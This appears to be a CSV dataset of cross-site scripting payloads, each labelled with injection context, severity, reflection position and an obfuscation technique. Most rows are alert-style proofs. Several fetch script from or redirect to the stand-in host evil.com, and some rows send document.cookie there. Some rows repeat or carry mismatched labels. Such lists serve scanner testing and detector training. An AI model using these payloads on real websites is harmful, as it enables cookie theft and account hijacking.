payload,payload_with_context,context,severity,source,sink,reflection_position,technique
#{alert(1)},#{alert(1)} [position:script],script_injection,high,,,script,original
""" onfocus=alert(1) autofocus=""",""" onfocus=alert(1) autofocus="" [position:attribute]",attribute,high,,,attribute,original
"<EmBeD SrC=""jAvAsCrIpT:AlErT(1)"">","<EmBeD SrC=""jAvAsCrIpT:AlErT(1)""> [position:html_body]",tag_injection,medium,,,html_body,obfuscated:mixed_case
"data:text/html,<script>alert(1)</script>","data:text/html,<script>alert(1)</script> [position:attribute]",js_uri,low,,,attribute,original
<svg onload=alert(1)>,<svg onload=alert(1)> [position:script],event_handler,high,,,script,original
""" onload=alert(1) x=""",""" onload=alert(1) x="" [position:attribute]",attribute,low,,,attribute,mutated
"document.write(""<img src=x onerror=alert(1)>"")","document.write(""<img src=x onerror=alert(1)>"") [position:style]",js_uri,high,,,style,original
"<svg/onload
=alert(	1)>","<svg/onload
=alert(	1)> [position:html_body]",tag_injection,low,,,html_body,obfuscated:tab_newline_inject
<SCRIPT>alert(1)</SCRIPT>,<SCRIPT>alert(1)</SCRIPT> [position:script],script_injection,low,,,script,original
"""><img src=x onerror=alert(1)>","""><img src=x onerror=alert(1)> [position:attribute]",attribute,medium,,,attribute,obfuscated:comment_inject
""" oNlOaD=AlErT(1) x=""",""" oNlOaD=AlErT(1) x="" [position:attribute]",attribute,low,,,attribute,obfuscated:mixed_case
\' OnErRoR=AlErT(1)//,\' OnErRoR=AlErT(1)// [position:script],attribute_escape,medium,,,script,obfuscated:mixed_case
<input onfocus=alert(1) autofocus>,<input onfocus=alert(1) autofocus> [position:attribute],js_uri,high,,,attribute,original
<marquee onstart=alert(1)>,<marquee onstart=alert(1)> [position:script],script_injection,high,,,script,mutated
<img/src=x onerror=confirm(1)//>,<img/src=x onerror=confirm(1)//> [position:html_body],script_injection,low,,,html_body,mutated
"""><img src=x onerror=alert(1)>","""><img src=x onerror=alert(1)> [position:attribute]",attribute,high,,,attribute,obfuscated:comment_inject
j\u0061v\u0061script:confirm(1),j\u0061v\u0061script:confirm(1) [position:attribute],js_uri,high,,,attribute,obfuscated:unicode_escape
\u003e\u003cimg src=1 oncut=alert(0)\u003e,\u003e\u003cimg src=1 oncut=alert(0)\u003e [position:attribute],attribute,medium,,,attribute,mutated
""" onfocus=alert(1) autofocus=""",""" onfocus=alert(1) autofocus="" [position:attribute]",attribute,low,,,attribute,mutated
javascript:alert(1),javascript:alert(1) [position:none],js_uri,high,,,none,obfuscated:hex_escape
onerror=alert(0);>,onerror=alert(0);> [position:html_body],html_body,medium,,,html_body,none
"\"" OnErRoR=AlErT(1)//","\"" OnErRoR=AlErT(1)// [position:script]",attribute_escape,low,,,script,obfuscated:mixed_case
' onmouseover=alert(1) ',' onmouseover=alert(1) ' [position:none],event_handler,high,,,none,original
<script>prompt(1)</script>,<script>prompt(1)</script> [position:html_body],script_injection,low,,,html_body,original
"setTimeout(""alert(1)"",0)","setTimeout(""alert(1)"",0) [position:script]",dom_sink,high,,,script,original
"<%00vIdeO><sourCe onerror=""['al\u0065'+'rt'][0]['\x63onstructor']['\x63onstructor']('return this')()[['al\u0065'+'rt'][0]]([String.fromCharCode(8238)+[!+[]+!+[]]+[![]+[]][+[]]])"">","<%00vIdeO><sourCe onerror=""['al\u0065'+'rt'][0]['\x63onstructor']['\x63onstructor']('return this')()[['al\u0065'+'rt'][0]]([String.fromCharCode(8238)+[!+[]+!+[]]+[![]+[]][+[]]])""> [position:html_body]",html_body,high,,,html_body,mutated
javascript:confirm(1),javascript:confirm(1) [position:html_body],template_injection,low,,,html_body,mutated
""" onload=alert(1) x=""",""" onload=alert(1) x="" [position:attribute]",attribute,medium,,,attribute,original
<svg onload=alert()>,<svg onload=alert()> [position:html_body],html_body,medium,,,html_body,none
"<embed src=""javaSCRIPT:alert(1)"">","<embed src=""javaSCRIPT:alert(1)""> [position:html_body]",tag_injection,high,,,html_body,mutated
"' ><img src
=x onerror
=alert(	1)>","' ><img src
=x onerror
=alert(	1)> [position:attribute]",attribute,high,,,attribute,obfuscated:tab_newline_inject
&lt;img/src=x onerror=alert(1)//&gt;,&lt;img/src=x onerror=alert(1)//&gt; [position:html_body],event_handler,low,,,html_body,obfuscated:html_entity
%3Cscript src=//evil.com/xss.js%3E%3C/script%3E,%3Cscript src=//evil.com/xss.js%3E%3C/script%3E [position:html_body],script_injection,low,,,html_body,obfuscated:url_encode
"j\u0061v\u0061script:void(document.\u006coc\u0061tion=""http://evi\u006c.com"")","j\u0061v\u0061script:void(document.\u006coc\u0061tion=""http://evi\u006c.com"") [position:attribute]",attribute,medium,,,attribute,obfuscated:unicode_escape
"javascript:void(document.location=""http://evil.com"")","javascript:void(document.location=""http://evil.com"") [position:none]",js_uri,low,,,none,original
<script>alert(document.domain)</script>,<script>alert(document.domain)</script> [position:html_body],script_injection,high,,,html_body,original
"{{constructor.constructor(""alert(1)"")()}}","{{constructor.constructor(""alert(1)"")()}} [position:html_body]",template_injection,high,,,html_body,original
${alert(1)},${alert(1)} [position:attribute],attribute,high,,,attribute,mutated
"eval(""alert(1)"")","eval(""alert(1)"") [position:none]",dom_sink,high,,,none,mutated
' onmouseover=al'+'ert(1) ',' onmouseover=al'+'ert(1) ' [position:attribute],attribute,high,,,attribute,obfuscated:concat_split
"eval(""alert(1)"")","eval(""alert(1)"") [position:script]",dom_sink,high,,,script,obfuscated:html_entity
<svg onload=alert(1)>,<svg onload=alert(1)> [position:attribute],event_handler,low,,,attribute,mutated
"""><img src=x onerror=alert(1)>","""><img src=x onerror=alert(1)> [position:attribute]",attribute,medium,,,attribute,original
confirm(1))</SCRIPT>,confirm(1))</SCRIPT> [position:html_body],html_body,high,,,html_body,mutated
#{confirm(1)},#{confirm(1)} [position:script],template_injection,high,,,script,mutated
""" onload=alert(1) x=""",""" onload=alert(1) x="" [position:attribute]",attribute,high,,,attribute,mutated
<script src=//evil.com/xss.js></script>,<script src=//evil.com/xss.js></script> [position:html_body],script_injection,low,,,html_body,original
"{{constructor.constructor(""alert(1)"")()}}","{{constructor.constructor(""alert(1)"")()}} [position:script]",tag_injection,low,,,script,original
<script>alert(1)</script>,<script>alert(1)</script> [position:html_body],script_injection,medium,,,html_body,mutated
\' onerror=alert(1)//,\' onerror=alert(1)// [position:style],js_uri,high,,,style,mutated
"document.body.innerHTML=""<img src=x onerror=alert(1)>""","document.body.innerHTML=""<img src=x onerror=alert(1)>"" [position:script]",dom_sink,medium,,,script,obfuscated:comment_inject
&quot; onerror=confirm(1) x=&quot;,&quot; onerror=confirm(1) x=&quot; [position:script],attribute_escape,low,,,script,mutated
<script src=//evil.com/xss.js></script>,<script src=//evil.com/xss.js></script> [position:html_body],script_injection,low,,,html_body,mutated
&quot; onerror=al'+'ert(1) x=&quot;,&quot; onerror=al'+'ert(1) x=&quot; [position:script],attribute_escape,low,,,script,obfuscated:concat_split
#{alert(1)},#{alert(1)} [position:script],template_injection,medium,,,script,mutated
<input onfocus=alert(1) autofocus>,<input onfocus=alert(1) autofocus> [position:script],event_handler,medium,,,script,original
<script>alert(	1)</script>,<script>alert(	1)</script> [position:html_body],script_injection,low,,,html_body,obfuscated:tab_newline_inject
<svg/onload=alert(1)>,<svg/onload=alert(1)> [position:script],tag_injection,medium,,,script,original
javascript:confirm(1),javascript:confirm(1) [position:script],js_uri,low,,,script,original
"<object data=""javascript:alert(1)"">","<object data=""javascript:alert(1)""> [position:html_body]",script_injection,medium,,,html_body,mutated
<svg onload=alert()>,<svg onload=alert()> [position:html_body],html_body,medium,,,html_body,none
<marquee onstart=alert(1)>,<marquee onstart=alert(1)> [position:style],event_handler,medium,,,style,original
<svg/onload=alert(1)>,<svg/onload=alert(1)> [position:html_body],tag_injection,low,,,html_body,mutated
"document.write(""<img src=x onerror=confirm(1)>"")","document.write(""<img src=x onerror=confirm(1)>"") [position:html_body]",tag_injection,high,,,html_body,mutated
"eval(""alert(1)"")","eval(""alert(1)"") [position:script]",dom_sink,high,,,script,obfuscated:html_entity
<marquee onstart=confirm(1)>,<marquee onstart=confirm(1)> [position:attribute],event_handler,low,,,attribute,mutated
&lt;marquee onstart=alert(1)&gt;,&lt;marquee onstart=alert(1)&gt; [position:script],dom_sink,high,,,script,obfuscated:html_entity
"javascript:void(document.location=""http://evil.com"")","javascript:void(document.location=""http://evil.com"") [position:none]",js_uri,high,,,none,original
#{alert(1)},#{alert(1)} [position:script],template_injection,medium,,,script,obfuscated:html_entity
javascript:alert(1),javascript:alert(1) [position:style],js_uri,low,,,style,original
"document.body.innerHTML=""<img src=x onerror=alert(1)>""","document.body.innerHTML=""<img src=x onerror=alert(1)>"" [position:script]",script_injection,medium,,,script,mutated
#{alert(1)},#{alert(1)} [position:style],js_uri,medium,,,style,original
"document.write(""<img src=x onerror=confirm(1)>"")","document.write(""<img src=x onerror=confirm(1)>"") [position:script]",dom_sink,low,,,script,mutated
"\x3cembed src=""javascript:alert(1)""\x3e","\x3cembed src=""javascript:alert(1)""\x3e [position:html_body]",tag_injection,medium,,,html_body,obfuscated:hex_escape
' ><svg src=x onerror=alert(1)>,' ><svg src=x onerror=alert(1)> [position:attribute],event_handler,medium,,,attribute,mutated
<script>alert(document.domain)</script>,<script>alert(document.domain)</script> [position:script],script_injection,high,,,script,original
\' onerror=confirm(1)//,\' onerror=confirm(1)// [position:none],attribute_escape,low,,,none,mutated
"document.body.innerHTML=""<img src=x onload=alert(1)>""","document.body.innerHTML=""<img src=x onload=alert(1)>"" [position:none]",dom_sink,high,,,none,mutated
""" onfocus=al'+'ert(1) autofocus=""",""" onfocus=al'+'ert(1) autofocus="" [position:attribute]",attribute,medium,,,attribute,obfuscated:concat_split
&quot; onerror=alert(1) x=&quot;,&quot; onerror=alert(1) x=&quot; [position:html_body],attribute_escape,medium,,,html_body,original
"%3Cobject data=""javascript:alert(1)""%3E","%3Cobject data=""javascript:alert(1)""%3E [position:script]",tag_injection,high,,,script,obfuscated:url_encode
"<embed src=""javascr/**/ipt:alert(1)"">","<embed src=""javascr/**/ipt:alert(1)""> [position:html_body]",tag_injection,low,,,html_body,obfuscated:comment_inject
{{7*7}},{{7*7}} [position:html_body],template_injection,low,,,html_body,mutated
<scr/**/ipt>prompt(1)</scr/**/ipt>,<scr/**/ipt>prompt(1)</scr/**/ipt> [position:html_body],script_injection,low,,,html_body,obfuscated:comment_inject
<video src=x onerror=alert(1)>,<video src=x onerror=alert(1)> [position:attribute],event_handler,low,,,attribute,original
"data:text/html,<script>confirm(1)</script>","data:text/html,<script>confirm(1)</script> [position:html_body]",js_uri,high,,,html_body,mutated
javascr/**/ipt:alert(document.domain),javascr/**/ipt:alert(document.domain) [position:style],js_uri,medium,,,style,obfuscated:comment_inject
<script>alert(1)</script>,<script>alert(1)</script> [position:html_body],script_injection,medium,,,html_body,original
<img src=x onerror=alert(1)>,<img src=x onerror=alert(1)> [position:script],tag_injection,low,,,script,original
<iframe/onload=alert(0);>,<iframe/onload=alert(0);> [position:html_body],html_body,medium,,,html_body,none
<svg on\u006co\u0061d=\u0061\u006cert(1)>,<svg on\u006co\u0061d=\u0061\u006cert(1)> [position:style],event_handler,medium,,,style,obfuscated:unicode_escape
' ><img src=x onerror=alert(1)>,' ><img src=x onerror=alert(1)> [position:attribute],attribute,low,,,attribute,obfuscated:comment_inject
javascr/**/ipt:confirm(1),javascr/**/ipt:confirm(1) [position:style],js_uri,low,,,style,obfuscated:comment_inject
"javascript:void(document.location=""http://evil.com"")","javascript:void(document.location=""http://evil.com"") [position:script]",tag_injection,low,,,script,original
\x3cimg src=x onerror=alert(1)\x3e,\x3cimg src=x onerror=alert(1)\x3e [position:html_body],tag_injection,medium,,,html_body,obfuscated:hex_escape
"data:text/html,<script>alert(1)</script>","data:text/html,<script>alert(1)</script> [position:html_body]",template_injection,low,,,html_body,mutated
top.alert(1))</SCRIPT>,top.alert(1))</SCRIPT> [position:html_body],html_body,high,,,html_body,mutated
""" onload=alert(1) x=""",""" onload=alert(1) x="" [position:html_body]",script_injection,medium,,,html_body,original
"{{constructor.constructor(""alert(1)"")()}}","{{constructor.constructor(""alert(1)"")()}} [position:style]",template_injection,low,,,style,original
\x3cSCRIPT\x3ealert(1)\x3c/SCRIPT\x3e,\x3cSCRIPT\x3ealert(1)\x3c/SCRIPT\x3e [position:html_body],script_injection,high,,,html_body,obfuscated:hex_escape
"{{constructor.constructor(""alert(1)"")()}}","{{constructor.constructor(""alert(1)"")()}} [position:style]",template_injection,low,,,style,original
"location=""javascript:alert(1)""","location=""javascript:alert(1)"" [position:script]",dom_sink,medium,,,script,mutated
"setTimeout(""alert(1)"",0)","setTimeout(""alert(1)"",0) [position:attribute]",attribute,high,,,attribute,mutated
<SCRIPT src=//evil.com/xss.js></SCRIPT>,<SCRIPT src=//evil.com/xss.js></SCRIPT> [position:script],script_injection,low,,,script,mutated
#{alert(1)},#{alert(1)} [position:script],template_injection,low,,,script,original
""" onfocus=alert(1) autofocus=""",""" onfocus=alert(1) autofocus="" [position:attribute]",attribute,medium,,,attribute,mutated
"<img src
=x onerror
=alert(	1)>","<img src
=x onerror
=alert(	1)> [position:attribute]",event_handler,low,,,attribute,obfuscated:tab_newline_inject
<input onfocus=alert(1) autofocus>,<input onfocus=alert(1) autofocus> [position:attribute],event_handler,low,,,attribute,obfuscated:comment_inject
{{7*7}},{{7*7}} [position:style],template_injection,high,,,style,mutated
<marquee onstart=alert(1)>,<marquee onstart=alert(1)> [position:html_body],tag_injection,high,,,html_body,mutated
' onerror=alert(1) x=',' onerror=alert(1) x=' [position:none],attribute_escape,medium,,,none,original
<img src=x onerror=alert(1)>,<img src=x onerror=alert(1)> [position:script],dom_sink,high,,,script,original
' onerror=alert(1) x=',' onerror=alert(1) x=' [position:script],tag_injection,high,,,script,original
"eval(""alert(1)"")","eval(""alert(1)"") [position:attribute]",attribute,low,,,attribute,obfuscated:hex_escape
<SCRIPT>al'+'ert(1)</SCRIPT>,<SCRIPT>al'+'ert(1)</SCRIPT> [position:script],script_injection,low,,,script,obfuscated:concat_split
innerHTML=location.hash>#<meter>alert(1)</script>,innerHTML=location.hash>#<meter>alert(1)</script> [position:html_body],html_body,high,,,html_body,mutated
%3Cimg/src=%3Dx+onpointerover=alert(2)%3D,%3Cimg/src=%3Dx+onpointerover=alert(2)%3D [position:attribute],attribute,medium,,,attribute,mutated
""" onload=alert(1) x=""",""" onload=alert(1) x="" [position:attribute]",attribute,medium,,,attribute,original
javascript:alert(document.domain),javascript:alert(document.domain) [position:attribute],js_uri,medium,,,attribute,original
"<object data=""javascript:alert(1)"">","<object data=""javascript:alert(1)""> [position:attribute]",template_injection,high,,,attribute,original
#{alert(1)},#{alert(1)} [position:html_body],template_injection,low,,,html_body,original
<image src/onerror=alert(1)>,<image src/onerror=alert(1)> [position:html_body],html_body,medium,,,html_body,none
<svg/on\u006co\u0061d=\u0061\u006cert(1)>,<svg/on\u006co\u0061d=\u0061\u006cert(1)> [position:attribute],attribute,high,,,attribute,obfuscated:unicode_escape
"<object data=""javascript:alert(1)"">","<object data=""javascript:alert(1)""> [position:html_body]",tag_injection,medium,,,html_body,original
"onerror=""alert(document.cookie)""","onerror=""alert(document.cookie)"" [position:html_body]",html_body,medium,,,html_body,mutated
javascript:alert(	document.domain),javascript:alert(	document.domain) [position:html_body],js_uri,medium,,,html_body,obfuscated:tab_newline_inject
"< script>d.innerHTML+='';</script>//[""'`-->]]>]</div>","< script>d.innerHTML+='';</script>//[""'`-->]]>]</div> [position:html_body]",attribute,high,,,html_body,mutated
"setTimeout(""alert(1)"",0)","setTimeout(""alert(1)"",0) [position:script]",dom_sink,medium,,,script,original
"document.write(""\x3cimg src=x onerror=alert(1)\x3e"")","document.write(""\x3cimg src=x onerror=alert(1)\x3e"") [position:script]",dom_sink,low,,,script,obfuscated:hex_escape
#{\u0061\u006cert(1)},#{\u0061\u006cert(1)} [position:style],template_injection,medium,,,style,obfuscated:unicode_escape
<script>confirm(1)</script>,<script>confirm(1)</script> [position:script],script_injection,medium,,,script,original
javaSCRIPT:confirm(1),javaSCRIPT:confirm(1) [position:html_body],script_injection,medium,,,html_body,mutated
"location=""javascript:alert(1)""","location=""javascript:alert(1)"" [position:none]",dom_sink,medium,,,none,original
< svg onload=alert()>,< svg onload=alert()> [position:html_body],html_body,medium,,,html_body,mutated
"<object data=""javascript:al'+'ert(1)"">","<object data=""javascript:al'+'ert(1)""> [position:script]",dom_sink,medium,,,script,obfuscated:concat_split
"document.write(""<svg src=x onerror=alert(1)>"")","document.write(""<svg src=x onerror=alert(1)>"") [position:html_body]",script_injection,high,,,html_body,mutated
"\""><img src=x onload=alert(1)>","\""><img src=x onload=alert(1)> [position:script]",attribute_escape,low,,,script,mutated
"\' onerror
=alert(	1)//","\' onerror
=alert(	1)// [position:html_body]",attribute_escape,low,,,html_body,obfuscated:tab_newline_inject
<BODY ONLOAD=alert(’XSS’)>,<BODY ONLOAD=alert(’XSS’)> [position:html_body],html_body,medium,,,html_body,case_variation
\x3cvideo src=x onerror=alert(1)\x3e,\x3cvideo src=x onerror=alert(1)\x3e [position:script],event_handler,medium,,,script,obfuscated:hex_escape
"<ifr\u0061me src=""j\u0061v\u0061script:\u0061\u006cert(1)"">","<ifr\u0061me src=""j\u0061v\u0061script:\u0061\u006cert(1)""> [position:script]",tag_injection,low,,,script,obfuscated:unicode_escape
javascript:alert(1),javascript:alert(1) [position:html_body],js_uri,high,,,html_body,obfuscated:hex_escape
javascript:alert(1),javascript:alert(1) [position:script],js_uri,low,,,script,mutated
<script>prompt(1)</script>,<script>prompt(1)</script> [position:html_body],script_injection,medium,,,html_body,original
"""><img src=x onerror=alert(1)>","""><img src=x onerror=alert(1)> [position:attribute]",attribute,low,,,attribute,original
\' onerror=alert(1)//,\' onerror=alert(1)// [position:style],attribute_escape,low,,,style,original
<img src=x onerror=alert(1)>,<img src=x onerror=alert(1)> [position:html_body],tag_injection,high,,,html_body,original
\' onerror=alert(1)//,\' onerror=alert(1)// [position:attribute],event_handler,high,,,attribute,original
"data:text/html,<script>alert(1)</script>","data:text/html,<script>alert(1)</script> [position:attribute]",js_uri,medium,,,attribute,mutated
<svg/onload=confirm(1)>,<svg/onload=confirm(1)> [position:script],tag_injection,high,,,script,mutated
javascript:confirm(1),javascript:confirm(1) [position:attribute],js_uri,medium,,,attribute,mutated
<textarea>d.innerHTML+='';</script>,<textarea>d.innerHTML+='';</script> [position:html_body],html_body,high,,,html_body,mutated
<svg/onload=alert(1)>,<svg/onload=alert(1)> [position:script],script_injection,high,,,script,mutated
"&lt;embed src=""javascript:alert(1)""&gt;","&lt;embed src=""javascript:alert(1)""&gt; [position:attribute]",attribute,high,,,attribute,obfuscated:html_entity
"<IfRaMe sRc=""JaVaScRiPt:aLeRt(1)"">","<IfRaMe sRc=""JaVaScRiPt:aLeRt(1)""> [position:html_body]",tag_injection,high,,,html_body,obfuscated:mixed_case
javascript:alert(document.domain),javascript:alert(document.domain) [position:attribute],js_uri,medium,,,attribute,original
"<ifr\u0061me src=""j\u0061v\u0061script:\u0061\u006cert(1)"">","<ifr\u0061me src=""j\u0061v\u0061script:\u0061\u006cert(1)""> [position:script]",tag_injection,high,,,script,obfuscated:unicode_escape
javascript:alert(document.domain),javascript:alert(document.domain) [position:attribute],js_uri,medium,,,attribute,original
\' onerror=al'+'ert(1)//,\' onerror=al'+'ert(1)// [position:script],attribute_escape,high,,,script,obfuscated:concat_split
\x3csvg/onload=alert(1)\x3e,\x3csvg/onload=alert(1)\x3e [position:script],tag_injection,medium,,,script,obfuscated:hex_escape
<video src=x onerror=alert(1)>,<video src=x onerror=alert(1)> [position:style],event_handler,low,,,style,original
\x3cscript\x3eprompt(1)\x3c/script\x3e,\x3cscript\x3eprompt(1)\x3c/script\x3e [position:html_body],script_injection,low,,,html_body,obfuscated:hex_escape
""" onerror=alert(1) x=""",""" onerror=alert(1) x="" [position:none]",dom_sink,medium,,,none,original
<%= alert(1) %>,<%= alert(1) %> [position:style],template_injection,low,,,style,original
#{confirm(1)},#{confirm(1)} [position:script],template_injection,low,,,script,mutated
""" onload=alert(1) x=""",""" onload=alert(1) x="" [position:attribute]",attribute,low,,,attribute,mutated
"""><img src=x onerror=alert(1)>","""><img src=x onerror=alert(1)> [position:attribute]",attribute,high,,,attribute,original
<video src=x onerror=alert(1)>,<video src=x onerror=alert(1)> [position:html_body],event_handler,high,,,html_body,obfuscated:comment_inject
"javascript:void(document.location=""http://evil.com"")","javascript:void(document.location=""http://evil.com"") [position:script]",js_uri,medium,,,script,original
\' onerror=alert(1)//,\' onerror=alert(1)// [position:html_body],attribute_escape,high,,,html_body,original
<video src=x onerror=alert(1)>,<video src=x onerror=alert(1)> [position:script],event_handler,low,,,script,original
"&quot; onerror
=alert(	1) x
=&quot;","&quot; onerror
=alert(	1) x
=&quot; [position:style]",attribute_escape,high,,,style,obfuscated:tab_newline_inject
\' onerror=alert(1)//,\' onerror=alert(1)// [position:script],dom_sink,high,,,script,original
<svg/onload=al'+'ert(1)>,<svg/onload=al'+'ert(1)> [position:html_body],tag_injection,high,,,html_body,obfuscated:concat_split
"<object data=""javascript:confirm(1)"">","<object data=""javascript:confirm(1)""> [position:script]",tag_injection,low,,,script,mutated
' ><img src=x onerror=alert(1)>,' ><img src=x onerror=alert(1)> [position:attribute],attribute,high,,,attribute,original
"<object data=""javascr/**/ipt:alert(1)"">","<object data=""javascr/**/ipt:alert(1)""> [position:style]",js_uri,high,,,style,obfuscated:comment_inject
&quot; onerror=alert(1) x=&quot;,&quot; onerror=alert(1) x=&quot; [position:attribute],attribute_escape,medium,,,attribute,mutated
<script>prompt(1)</script>,<script>prompt(1)</script> [position:html_body],js_uri,high,,,html_body,mutated
"document.body.innerHTML=""<img src=x onload=alert(1)>""","document.body.innerHTML=""<img src=x onload=alert(1)>"" [position:script]",script_injection,high,,,script,mutated
javascript:alert(1),javascript:alert(1) [position:attribute],attribute_escape,low,,,attribute,original
<scr/**/ipt src=//evil.com/xss.js></scr/**/ipt>,<scr/**/ipt src=//evil.com/xss.js></scr/**/ipt> [position:html_body],tag_injection,medium,,,html_body,obfuscated:comment_inject
"javascript:void(document.location=""http://evil.com"")","javascript:void(document.location=""http://evil.com"") [position:html_body]",js_uri,high,,,html_body,original
"<script>document.location=""http://evil.com/?c=""+document.cookie</script>","<script>document.location=""http://evil.com/?c=""+document.cookie</script> [position:html_body]",script_injection,high,,,html_body,original
</tag><svg onload=alert(1)>,</tag><svg onload=alert(1)> [position:html_body],html_body,medium,,,html_body,none
<svg/onload=alert(1)>,<svg/onload=alert(1)> [position:script],tag_injection,medium,,,script,original
"data:text/html,<script>alert(1)</script>","data:text/html,<script>alert(1)</script> [position:style]",js_uri,high,,,style,mutated
%3Cscript%3Eprompt(1)%3C/script%3E,%3Cscript%3Eprompt(1)%3C/script%3E [position:script],script_injection,high,,,script,obfuscated:url_encode
""" onload=alert(1) x=""",""" onload=alert(1) x="" [position:attribute]",attribute,low,,,attribute,original
<script>alert(document.domain)</script>,<script>alert(document.domain)</script> [position:script],script_injection,high,,,script,original
javascript:confirm(1),javascript:confirm(1) [position:attribute],js_uri,low,,,attribute,mutated
&lt;script&gt;confirm(1)&lt;/script&gt;,&lt;script&gt;confirm(1)&lt;/script&gt; [position:script],script_injection,high,,,script,obfuscated:html_entity
<image src/onerror=alert(1)>,<image src/onerror=alert(1)> [position:html_body],html_body,medium,,,html_body,none
%3Cscript%3Econfirm(1)%3C/script%3E,%3Cscript%3Econfirm(1)%3C/script%3E [position:script],script_injection,high,,,script,obfuscated:url_encode
"document.body.innerHTML=""<img src=x onload=alert(1)>""","document.body.innerHTML=""<img src=x onload=alert(1)>"" [position:none]",attribute_escape,high,,,none,mutated
<%= aLeRt(1) %>,<%= aLeRt(1) %> [position:script],script_injection,low,,,script,obfuscated:mixed_case
<details open ontoggle=alert(1)>,<details open ontoggle=alert(1)> [position:script],event_handler,medium,,,script,original
#javascript:alert(1),#javascript:alert(1) [position:attribute],url,medium,,,attribute,none
""" onload
=alert(	1) x
=""",""" onload
=alert(	1) x
="" [position:attribute]",attribute,high,,,attribute,obfuscated:tab_newline_inject
&quot; onerror=alert(1) x=&quot;,&quot; onerror=alert(1) x=&quot; [position:script],tag_injection,medium,,,script,mutated
\x3cscript\x3econfirm(1)\x3c/script\x3e,\x3cscript\x3econfirm(1)\x3c/script\x3e [position:html_body],script_injection,medium,,,html_body,obfuscated:hex_escape
\' onerror=\u0061\u006cert(1)//,\' onerror=\u0061\u006cert(1)// [position:script],tag_injection,high,,,script,obfuscated:unicode_escape
"\"" onerror=alert(1)//","\"" onerror=alert(1)// [position:script]",attribute_escape,medium,,,script,obfuscated:hex_escape
‘)alert(1);//,‘)alert(1);// [position:attribute],attribute,medium,,,attribute,none
' ><img src=x onerror=alert(1)>,' ><img src=x onerror=alert(1)> [position:script],tag_injection,high,,,script,original
"<iframe src=""javascript:alert(1)"">","<iframe src=""javascript:alert(1)""> [position:html_body]",js_uri,medium,,,html_body,original
javascript:alert(document.domain),javascript:alert(document.domain) [position:attribute],js_uri,high,,,attribute,original
"setTimeout(""alert(1)"",0)","setTimeout(""alert(1)"",0) [position:script]",dom_sink,high,,,script,original
"""><img src=x onerror=confirm(1)>","""><img src=x onerror=confirm(1)> [position:attribute]",attribute,high,,,attribute,mutated
"""><img src=x onerror=confirm(1)>","""><img src=x onerror=confirm(1)> [position:html_body]",script_injection,high,,,html_body,mutated
"""><svg src=x onerror=alert(1)>","""><svg src=x onerror=alert(1)> [position:attribute]",attribute,low,,,attribute,mutated
"document.body.innerHTML=""<img src=x onerror=confirm(1)>""","document.body.innerHTML=""<img src=x onerror=confirm(1)>"" [position:attribute]",attribute,medium,,,attribute,mutated
<details open ontoggle=al'+'ert(1)>,<details open ontoggle=al'+'ert(1)> [position:attribute],attribute,high,,,attribute,obfuscated:concat_split
\' onerror=alert(1)//,\' onerror=alert(1)// [position:script],attribute_escape,medium,,,script,obfuscated:html_entity
"eval(""alert(1)"")","eval(""alert(1)"") [position:script]",dom_sink,high,,,script,mutated
"javascript:void(document.location=""http://evil.com"")","javascript:void(document.location=""http://evil.com"") [position:script]",event_handler,high,,,script,original
${alert(1)},${alert(1)} [position:attribute],template_injection,high,,,attribute,original
#{confirm(1)},#{confirm(1)} [position:script],dom_sink,high,,,script,mutated
"<iframe src=""javascript:alert(1)"">","<iframe src=""javascript:alert(1)""> [position:script]",tag_injection,medium,,,script,mutated
""" onfocus=alert(1) autofocus=""",""" onfocus=alert(1) autofocus="" [position:attribute]",attribute,high,,,attribute,mutated
&quot; onerror=alert(1) x=&quot;,&quot; onerror=alert(1) x=&quot; [position:style],js_uri,medium,,,style,original
<BODY ONLOAD=alert(’XSS’)>,<BODY ONLOAD=alert(’XSS’)> [position:html_body],html_body,medium,,,html_body,case_variation
javascript:confirm(1),javascript:confirm(1) [position:attribute],attribute,medium,,,attribute,mutated
{{7*7}},{{7*7}} [position:html_body],script_injection,low,,,html_body,mutated
javascript:alert(document.domain),javascript:alert(document.domain) [position:script],js_uri,low,,,script,original
"<script>document.location=""http://evil.com/?c=""+document.cookie</script>","<script>document.location=""http://evil.com/?c=""+document.cookie</script> [position:html_body]",script_injection,medium,,,html_body,original
"<script>document.location=""http://evil.com/?c=""+document.cookie</script>","<script>document.location=""http://evil.com/?c=""+document.cookie</script> [position:html_body]",script_injection,high,,,html_body,mutated
<SCRIPT>alert(1)</SCRIPT>,<SCRIPT>alert(1)</SCRIPT> [position:script],script_injection,high,,,script,original
"document.body.innerHTML=""<img src=x onerror=confirm(1)>""","document.body.innerHTML=""<img src=x onerror=confirm(1)>"" [position:style]",js_uri,high,,,style,mutated
